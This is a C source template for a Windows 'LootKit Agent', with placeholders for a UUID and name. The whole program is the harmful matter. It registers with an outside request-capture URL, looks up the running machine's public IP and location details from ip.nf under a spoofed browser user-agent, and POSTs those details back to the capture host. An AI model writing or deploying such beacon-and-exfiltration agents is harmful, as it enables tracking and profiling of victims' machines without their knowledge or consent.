#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>

int main(int argc, char *argv[])
{
    char *uuid = "{{uuid}}"; // Embed the UUID in the agent
    char *name = "{{name}}";
    printf("Name: %s\n", name);
    printf("Selected Options: {{options}}\n");
    printf("UUID: %s\n", uuid);
    char url[] = "https://reqinspect.alpine.cx/capture/9bc05d15-bc2a-41dc-84d2-9db7cf4053f1"; // https://reqinspect.alpine.cx/session/9bc05d15-bc2a-41dc-84d2-9db7cf4053f1

    // Build The URL
    char *full_url = malloc(strlen(url) + strlen(uuid) + strlen(name) + 20); // 20 is for the extra characters in the string
    sprintf(full_url, "%s?uuid=%s&name=%s", url, uuid, name);

    // Send blank GET request to full_url
    HINTERNET hInternet = InternetOpenA("LootKit Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hSession = InternetOpenUrlA(hInternet, full_url, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);
    InternetCloseHandle(hSession);
    // InternetCloseHandle(hInternet);

    // Make GET request to https://ip.nf/me.json
    char *ip_url = "https://ip.nf/me.json";
    HINTERNET hInternet2 = InternetOpenA("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hSession2 = InternetOpenUrlA(hInternet2, ip_url, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);
    char buffer[1024];
    DWORD bytesRead;
    DWORD totalBytesRead = 0;
    while (InternetReadFile(hSession2, buffer + totalBytesRead, sizeof(buffer) - totalBytesRead - 1, &bytesRead) && bytesRead)
    {
        totalBytesRead += bytesRead;
    }
    buffer[totalBytesRead] = '\0'; // null-terminate the buffer
    InternetCloseHandle(hSession2);
    InternetCloseHandle(hInternet2);

    // Output the buffer to console
    printf("\n%s\n", buffer);

    char hostname[256];                                         // Array to hold the hostname
    char path[1024];                                            // Array to hold the path
    sscanf(full_url, "https://%255[^/]%1023s", hostname, path); // Extract hostname and path from full_url

    // Initialize POST request
    HINTERNET hConnect = InternetConnectA(hInternet, hostname, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL)
    {
        fprintf(stderr, "InternetConnectA failed (%d)\n", GetLastError());
        return 1;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (hRequest == NULL)
    {
        fprintf(stderr, "HttpOpenRequestA failed (%d)\n", GetLastError());
        InternetCloseHandle(hConnect);
        return 1;
    }

    // Send POST request
    if (!HttpSendRequestA(hRequest, NULL, 0, buffer, totalBytesRead))
    {
        fprintf(stderr, "HttpSendRequestA failed (%d)\n", GetLastError());
    }

    // Close handles
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);

    printf("\nPress any key to exit...\n");
    getchar();
    free(full_url);


    return 0;
}
